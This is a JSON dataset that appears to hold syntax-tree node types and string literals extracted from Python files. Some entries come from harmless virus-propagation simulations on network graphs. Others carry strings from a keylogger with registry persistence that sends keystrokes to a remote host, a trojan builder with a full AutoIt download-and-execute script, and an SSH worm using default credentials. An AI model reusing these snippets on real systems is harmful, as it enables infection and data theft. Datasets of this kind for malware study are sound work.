            "ImportFrom",
            "For",
            "Store",
            "List",
            "Name"
        ],
        "Strings": [
            "append",
            "typeOfGraph",
            "TREE",
            "ring",
            "RING_GRAPH",
            "line.txt",
            "display",
            "tree",
            "ALL_CONNECTED_GRAPH",
            "sleep",
            "mesh.txt",
            "tree.txt",
            "star",
            "animationSteps",
            "MESH",
            "mesh",
            "star.txt",
            "time",
            "\ntestShape.py\n\nDescription: This file is meant to test if the shapes are being drawn correctly.\n            It will draw a networks with sizes of 5 to 15 starting with line and\n            ending with mesh network. It should be noted that each network is\n            visible for 1 second after being diplayed to the screen.\n\nNotes: In the first graph, it will draw a single red line that will remain\n        throughout the rest of the graphs. This is because the display object\n        is only meant to be used once per compliation.\n",
            "current",
            "fileMaker",
            "fullconnect.txt",
            "ring.txt",
            "displayVirusSpread",
            "line",
            "disp",
            "STAR",
            "LINE_GRAPH",
            "displayData",
            "MESH_GRAPH",
            "fullConnected",
            "drawGraphFromFile",
            "graphType",
            "LINE",
            "STAR_GRAPH",
            "make",
            "ALL_CONNECTED",
            "dataToDisplay",
            "range",
            "TREE_GRAPH",
            "RING"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Constant",
            "Module",
            "alias",
            "Call",
            "Load",
            "Dict",
            "Expr",
            "Attribute",
            "Import",
            "Subscript",
            "Store",
            "Name"
        ],
        "Strings": [
            "RUN_VIRUS",
            "shapeMaker",
            "TREE",
            "viruses",
            "ring",
            "runOnce",
            "fullConnect.txt",
            "Worm",
            "n",
            "line.txt",
            "shapeName",
            "tree",
            "sleep",
            "tree.txt",
            "star",
            "theNetwork",
            "NETWORK_SIZE",
            "MESH",
            "mesh",
            "LogicBomb",
            "simulateVirusSpread",
            "Trojan",
            "star.txt",
            "time",
            "RING",
            "fileMaker",
            "\ntestSimulation.py\n\nDescription: This file is meant to test an individual simulation of a given \n    virus in a given network. There are 6 different network shapes that you can\n    choose from and 4 diffent viruses\n\nNotes: You cannot run multiple viruses in one simulation\n        For visualization, it is not recommend to use more than 15 nodes in a \n        network\n",
            "ring.txt",
            "SuperVirus",
            "displayVirusSpread",
            "line",
            "disp",
            "createnetwork",
            "sim",
            "STAR",
            "NETWORK_SHAPE",
            "fullConnected",
            "shapeFileName",
            "Network",
            "graphType",
            "LINE",
            "ALL_CONNECTED",
            "virusDispatch",
            "shapeOfNetwork",
            "virus",
            "mesh.txt"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "Name",
            "ExceptHandler",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "Global",
            "Try",
            "Expr",
            "Return",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "BinOp",
            "ImportFrom",
            "arg",
            "Eq"
        ],
        "Strings": [
            "",
            "OpenKey",
            "hm",
            "pip install pyHook ; pip install pythoncom",
            "<BACK SPACE>",
            "socket",
            "file_name",
            "data",
            "sock",
            "realpath",
            "SOCK_STREAM",
            "key2change",
            "keys",
            "KEY_ALL_ACCESS",
            "sys",
            "SendToRemoteServer",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "dirname",
            "system",
            "\\",
            "os",
            "send",
            "pip install win32event ; pip install win32api ; pip install winerror",
            "HOST_IP",
            "GetConsoleWindow",
            "pyHook",
            "win32event",
            "win32console",
            "window",
            "__file__",
            "_winreg",
            "chr",
            "fp",
            " ",
            "Ascii",
            "event",
            "keyVal",
            "ShowWindow",
            "GetKeyPressedAndSendIt",
            "winerror",
            "SetValueEx",
            "AF_INET",
            "<ENTER>",
            "new_file_path",
            "HookKeyboard",
            "close",
            "pip install _winreg",
            "win32gui",
            "win32api",
            "HookManager",
            "connect",
            "AddProgramToStartup",
            "<TAB>",
            "HideCmd",
            "pythoncom",
            "*",
            "HKEY_CURRENT_USER",
            "PumpMessages",
            "REG_SZ",
            "path",
            "KeyDown",
            "HacKeD"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "Constant",
            "alias",
            "Call",
            "Load",
            "Slice",
            "Attribute",
            "Expr",
            "Tuple",
            "Import",
            "Subscript",
            "For",
            "Store",
            "keyword",
            "List",
            "Name"
        ],
        "Strings": [
            "fullconnect_data",
            "reshape",
            "plot",
            "figure",
            "ring_data",
            "show",
            "MESH",
            "simulateVirusSpread",
            "fullconnect.txt",
            "percent_infected",
            "mesh_data",
            "STAR",
            "i",
            "full_connect",
            "time_turns5",
            "plt",
            "Network",
            "graphType",
            "main",
            "Worm",
            "mesh.txt",
            "viruses",
            "\n    simulate all type of networks:\n    for each loop, the size of networks increase by 10\n\n    Output:\n            2-D array, where rows represent the simulation steps took until\n            malware finish propagating, columns represent the the type of \n            network in order of line, ring, star, tree, full connected, and mesh.\n\n",
            "N",
            "star",
            "mesh",
            "star.txt",
            "time",
            "time_turns3",
            "ylabel",
            "len",
            "print",
            "star_Network",
            "disp",
            "upper left",
            "fm",
            "tree_Network",
            "RING",
            "xlabel",
            "TREE",
            "legend",
            "ring",
            "runOnce",
            "time_taken",
            "ring_Network",
            "line.txt",
            "all_connected_Network",
            "time_turns6",
            "tree.txt",
            "star_data",
            "loc",
            "ring.txt",
            "line_Network",
            "line",
            "size_of_network",
            "sim",
            "tree_data",
            "matplotlib.pyplot",
            "LINE",
            "line_data",
            "Size of Network",
            "ALL_CONNECTED",
            "range",
            "virus",
            "append",
            "numpy",
            "n",
            "array",
            "time_turns4",
            "tree",
            "time_turns1",
            "infectionRates",
            "fileMaker",
            "title",
            "displayVirusSpread",
            "createnetwork",
            "mesh_Network",
            "Worm Infection",
            "time_turns2",
            "fig"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "Store",
            "Name",
            "FormattedValue",
            "ClassDef",
            "Constant",
            "Import",
            "Compare",
            "Not",
            "Expr",
            "USub",
            "JoinedStr",
            "Return",
            "keyword",
            "UnaryOp",
            "Eq",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "BinOp",
            "arg",
            "With"
        ],
        "Strings": [
            "",
            "/var/www/html/temp_",
            "replace",
            "\n#include <StaticConstants.au3>\n#include <WindowsConstants.au3>\nLocal $urlsArray = StringSplit($urls, \",\", 2 )\nFor $url In $urlsArray\n\t$sFile = _DownloadFile($url)\n\tshellExecute($sFile)\nNext\nFunc _DownloadFile($sURL)\n    Local $hDownload, $sFile\n    $sFile = StringRegExpReplace($sURL, \"^.*/\", \"\")\n    $sFile = StringReplace($sFile, \"#\", \"\")\n    $sDirectory = @TempDir & \"/\" & $sFile\n    $hDownload = InetGet($sURL, $sDirectory, 17, 1)\n    InetClose($hDownload)\n    Return $sDirectory\nEndFunc   ;==>_GetURLImage\n",
            "requests",
            "Local $urls = \"",
            "w",
            "zip",
            "url1",
            "realpath",
            "\"",
            "create",
            "AUT2EXE",
            "mode",
            "/generic.ico",
            "/",
            "file_type",
            "dirname",
            "[-] Using generaic icon.",
            "name_original_file",
            "[-] Can't find icon at ",
            "content",
            "zip_name",
            "__init__",
            "set_icon",
            ".",
            "os",
            "ZipFile",
            "url2",
            "mitm",
            "file_to_zip",
            "r",
            "f",
            "subprocess",
            "Trojan",
            "\"\n",
            "__file__",
            "compile",
            ",",
            "/temp_",
            "TROJAN_SOURCE_CODE_FILE",
            "\" /Icon \"",
            "out_file",
            "urls",
            "self",
            "icons_directory",
            "write",
            "\" /Out \"",
            "\" /In \"",
            "print",
            "trojan_file",
            "trojan.txt",
            "close",
            "ip",
            "wine \"",
            "trojan_code",
            ".ico",
            "trojan_name",
            "call",
            "chdir",
            "#",
            "shell",
            "get",
            "/icons",
            "icon",
            "Local $urls = \"http://",
            ".zip",
            "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe",
            "zipfile",
            "open",
            "path",
            "wb",
            "split",
            "isfile"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "alias",
            "Constant",
            "Call",
            "Load",
            "Attribute",
            "Expr",
            "Tuple",
            "If",
            "Import",
            "ImportFrom",
            "Not",
            "Store",
            "keyword",
            "UnaryOp",
            "Name"
        ],
        "Strings": [
            "store_true",
            "Zip trojan?",
            "options",
            "zip",
            "trojan",
            "Please specify out file, use --help argument for more info.",
            "evil_file_url",
            "create",
            "parser",
            "-o",
            "-e",
            "--icon",
            "--out-file",
            "--evil-file",
            "optparse",
            "--zip",
            "action",
            "dest",
            "Trojan",
            "out_file_path",
            "icon_path",
            "compile",
            "add_option",
            "help",
            "-z",
            "front_file_url",
            "Location to store the result.",
            "Direct URL to file that the user will see.",
            "error",
            "Direct URL to the evil file file.",
            "Please specify front file, use --help argument for more info.",
            "args",
            "Please specify evil file, use --help argument for more info.",
            "*",
            "OptionParser",
            "--front-file",
            "Trojan icon.",
            "-f",
            "-i",
            "parse_args"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "NotEq",
            "Subscript",
            "For",
            "Store",
            "Name",
            "ClassDef",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "Lt",
            "Mod",
            "Expr",
            "Return",
            "AugAssign",
            "Assign",
            "Add",
            "And",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "BoolOp",
            "BinOp",
            "Mult",
            "arg",
            "Eq"
        ],
        "Strings": [
            "ms",
            " this is an example virus, it has a 50% chance of infecting any neighboring viruses.\n    Model all future viruses after this one, and make sure they have a function called \n    infectOrNot, with that same interface \n",
            "chooseTarget",
            "numpy",
            "network",
            "clean",
            "round",
            "object",
            "susceptibility",
            "infectedCount",
            "p_success",
            "sleep",
            "strength",
            "n_neighbor",
            "N",
            "infecteCount",
            " every turn, an infected node sends the virus\n        to all neighbor nodes. This makes those nodes susceptible.\n        On the next turn, a scceptable node is infected if its strength\n        is less than that of the virus. If it does not become infected,\n        it becomes immune, and cannot become susceptible or spread the virus.",
            "__init__",
            "source",
            "susceptible",
            "LogicBomb",
            "adjacentNodes",
            "target",
            "Trojan",
            "strengthRange",
            "max_neighbor",
            "maxNode",
            "time",
            "int",
            "self",
            "SuperVirus",
            "uniform",
            "len",
            "probability",
            "retVal",
            "node",
            "random",
            "nodes",
            "chance",
            "Network",
            "immune",
            "infected",
            "infectedList",
            "State",
            "sourceID",
            "targetID",
            "Worm",
            "infectOrNot"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "Store",
            "Name",
            "FormattedValue",
            "ClassDef",
            "Constant",
            "Import",
            "Compare",
            "Expr",
            "JoinedStr",
            "Eq",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "arg",
            "With"
        ],
        "Strings": [
            "log",
            "requests",
            "file",
            "a",
            "Externe IP-adres van gebruiker: ",
            "logs/",
            "log_file",
            "response",
            "\n",
            "ip_address",
            "Onbekend",
            "self",
            "write",
            "status_code",
            "Wan_module",
            "https://api.ipify.org?format=json",
            "ip",
            "/log_wan.txt",
            "get",
            "json",
            "open",
            "id"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "For",
            "Store",
            "Name",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "Yield",
            "Tuple",
            "Import",
            "Compare",
            "Try",
            "Expr",
            "USub",
            "Return",
            "keyword",
            "UnaryOp",
            "Assign",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "arg",
            "Eq"
        ],
        "Strings": [
            "spread_via_ssh",
            " \n        It works to divide itself into machines with it in the same network by SSH.\n        And upload worm to another machine by sftp and download.\n        ",
            "network_address",
            "generate_addresses_on_network",
            "user",
            "SSHClient",
            "remote_address",
            "username",
            "CRITICAL",
            "paramiko",
            "getLogger",
            "passw",
            "The worm is succesfully connected to the remote host [{}, {}].",
            "network",
            " Possible SSH credentials of the victim. ",
            "The remote host refused connection with credentials {},{}.",
            "__main__",
            "str",
            "debug",
            " Network, on which the worm spreads. ",
            "sys",
            "The victim did not have passwords.txt",
            "open_sftp",
            "msfadmin",
            "Trying to spread on the remote host: {}",
            "ssh",
            ".",
            "__init__",
            "property",
            "setter",
            "sftp_client",
            "worm",
            "password",
            "AutoAddPolicy",
            "set_missing_host_key_policy",
            "credentials",
            "port",
            "Exception",
            "The victim had passwords.txt",
            "basicConfig",
            "self",
            "level",
            "print",
            "DEBUG",
            "close",
            "format",
            "root",
            "get",
            "connect",
            "host",
            "C:\\Users\\ragab\\worm.py",
            "C:\\Users\\ragab\\passwords.txt",
            "put",
            "victim_ragab_cridintional.txt",
            "setLevel",
            "argv",
            "logging",
            "__name__",
            "new_network",
            "load_system_host_keys",
            "_network",
            "range",
            "Worm",
            "split",
            "join",
            "192.168.1.0",
            " \nCreate a worm:\n    It works to divide itself into machines with it in the same network by SSH.\n    And upload worm to another machine by sftp and download.\n"
        ]
    }
]